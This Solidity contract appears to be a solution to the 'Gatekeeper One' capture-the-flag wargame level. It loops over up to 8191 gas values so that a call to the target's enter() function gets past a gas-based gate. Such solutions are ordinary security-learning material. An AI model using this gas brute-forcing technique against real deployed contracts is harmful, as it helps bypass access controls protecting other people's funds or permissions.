// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGatekeeper {
    function enter(bytes8) external returns (bool);
}

uint64 constant BASE_GAS = 32000;
uint64 constant TRIALS = 8191;

contract SolveGatekeeperOne {
    // Event
    event GateEntered(address indexed, uint64, bool);

    // Storage
    address owner;
    IGatekeeper gk;

    constructor (address _target) {
        require(_target.code.length > 0, "not a contract");
        owner = tx.origin;
        gk = IGatekeeper(_target);
    }

    function enter(bytes8 _gatekey) external returns (bool bEnter) {

        for (uint64 i = 0; i < TRIALS; i++) {
            uint256 gas = BASE_GAS + i;
            bytes memory data = abi.encodeWithSignature("enter(bytes8)", bytes8(_gatekey));
            (bool success, bytes memory result) = address(gk).call{gas: gas}(data);

            if (success) {
                (bEnter) = abi.decode(result, (bool));
                emit GateEntered(tx.origin, i, bEnter);
                break;
            }
        }
    }

}
